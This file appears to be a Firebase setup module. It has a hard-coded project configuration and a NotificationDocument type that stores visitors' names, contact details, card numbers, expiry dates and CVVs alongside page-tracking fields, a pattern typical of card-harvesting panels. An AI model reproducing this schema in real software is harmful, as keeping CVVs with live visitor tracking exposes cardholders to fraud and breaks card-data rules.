import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyBnBBMgQGN5NOelo-1VA45pCQMjwVu5gLE",
  authDomain: "gvsstc.firebaseapp.com",
  databaseURL: "https://gvsstc-default-rtdb.firebaseio.com",
  projectId: "gvsstc",
  storageBucket: "gvsstc.firebasestorage.app",
  messagingSenderId: "1029610207085",
  appId: "1:1029610207085:web:3413ab7ae0fa03a9958c64",
  measurementId: "G-G3R67QJ0DK"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}
